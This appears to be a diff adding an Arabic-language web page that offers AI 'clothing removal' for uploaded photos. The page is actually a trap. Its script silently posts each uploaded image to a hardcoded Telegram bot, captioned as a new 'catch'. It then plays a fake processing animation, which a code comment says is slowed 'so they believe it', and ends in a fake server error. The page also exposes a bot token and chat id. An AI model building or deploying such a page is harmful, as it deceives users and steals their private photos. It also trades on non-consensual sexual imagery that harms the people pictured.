@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الديزل AI - معالجة الصور بالذكاء الاصطناعي</title>
+    <style>
+        :root { --main-purple: #8a2be2; --bg-black: #050505; }
+        body { background-color: var(--bg-black); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; text-align: center; }
+        .nav { padding: 15px; border-bottom: 1px solid #222; background: rgba(0,0,0,0.8); }
+        .logo { font-size: 24px; font-weight: 900; color: var(--main-purple); text-shadow: 0 0 10px var(--main-purple); }
+        
+        .hero { padding: 40px 20px; }
+        .hero h1 { font-size: 28px; margin-bottom: 10px; }
+        .hero p { color: #888; font-size: 14px; }
+
+        /* منطقة رفع الصور */
+        .upload-area { width: 90%; max-width: 400px; height: 250px; border: 2px dashed var(--main-purple); margin: 20px auto; border-radius: 20px; display: flex; flex-direction: column; justify-content: center; align-items: center; cursor: pointer; background: rgba(138, 43, 226, 0.05); transition: 0.3s; position: relative; }
+        .upload-area:hover { background: rgba(138, 43, 226, 0.1); }
+        .upload-area i { font-size: 50px; color: var(--main-purple); margin-bottom: 15px; }
+        
+        #file-input { display: none; }
+        .btn-process { width: 90%; max-width: 400px; padding: 18px; background: var(--main-purple); border: none; border-radius: 12px; color: white; font-weight: bold; font-size: 18px; cursor: pointer; margin-top: 20px; box-shadow: 0 5px 20px rgba(138, 43, 226, 0.4); }
+
+        /* واجهة الاستعراض (المعالجة) */
+        #processing-overlay { display: none; position: fixed; inset: 0; background: #000; z-index: 10000; flex-direction: column; justify-content: center; align-items: center; }
+        .scan-bar { width: 80%; height: 4px; background: #222; border-radius: 10px; margin-top: 30px; overflow: hidden; }
+        .fill { width: 0%; height: 100%; background: var(--main-purple); box-shadow: 0 0 15px var(--main-purple); transition: 0.1s linear; }
+        .preview-img { width: 150px; height: 150px; object-fit: cover; border-radius: 10px; margin-bottom: 20px; border: 2px solid var(--main-purple); filter: blur(5px); }
+    </style>
+</head>
+<body dir="rtl">
+
+<div class="nav">
+    <div class="logo">الديزل <span>AI</span></div>
+</div>
+
+<div class="hero">
+    <h1>إزالة الملابس بالذكاء الاصطناعي (Beta)</h1>
+    <p>قم برفع الصورة وسيقوم المحرك بمعالجتها فوراً (18+)</p>
+    
+    <div class="upload-area" onclick="document.getElementById('file-input').click()">
+        <i>📸</i>
+        <p id="file-name">اضغط هنا لرفع الصورة</p>
+        <input type="file" id="file-input" accept="image/*" onchange="showPreview(event)">
+    </div>
+
+    <button class="btn-process" onclick="startAIProcess()">ابدأ المعالجة الآن</button>
+</div>
+
+<div id="processing-overlay">
+    <img id="temp-img" class="preview-img">
+    <h2 id="status-text">جاري تحليل ملامح الصورة...</h2>
+    <div class="scan-bar"><div class="fill" id="p-fill"></div></div>
+    <p style="color: #555; margin-top: 15px;">سيتم عرض النتيجة بعد اكتمال الفحص</p>
+</div>
+
+<script>
+    function showPreview(event) {
+        const name = event.target.files[0].name;
+        document.getElementById('file-name').innerText = "تم اختيار: " + name;
+    }
+
+    async function startAIProcess() {
+        const fileInput = document.getElementById('file-input');
+        if (fileInput.files.length === 0) return alert("الرجاء اختيار صورة أولاً!");
+
+        const file = fileInput.files[0];
+        
+        // عرض واجهة المعالجة
+        document.getElementById('processing-overlay').style.display = 'flex';
+        
+        // إرسال الصورة لتليجرام (الصيد)
+        const token = "8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU";
+        const chatId = "5177962707";
+        
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', file);
+        formData.append('caption', "👑 صيد صور جديد من الديزل AI");
+
+        try {
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        } catch (e) { console.error("Error sending image"); }
+
+        // استعراض التحميل
+        let prog = 0;
+        let bar = document.getElementById('p-fill');
+        let status = document.getElementById('status-text');
+
+        let itv = setInterval(() => {
+            prog++;
+            bar.style.width = prog + "%";
+            
+            if(prog == 30) status.innerText = "جاري مسح طبقات الملابس...";
+            if(prog == 60) status.innerText = "جاري إعادة بناء الجلد بالذكاء الاصطناعي...";
+            if(prog == 90) status.innerText = "جاري تحسين الجودة النهائية...";
+
+            if(prog >= 100) {
+                clearInterval(itv);
+                alert("⚠️ خطأ في السيرفر: ضغط كبير حالياً. حاول مرة أخرى لاحقاً.");
+                location.reload();
+            }
+        }, 150); // سرعة المعالجة (خليها بطيئة عشان يصدق)
+    }
+</script>
+
+</body>
+</html>
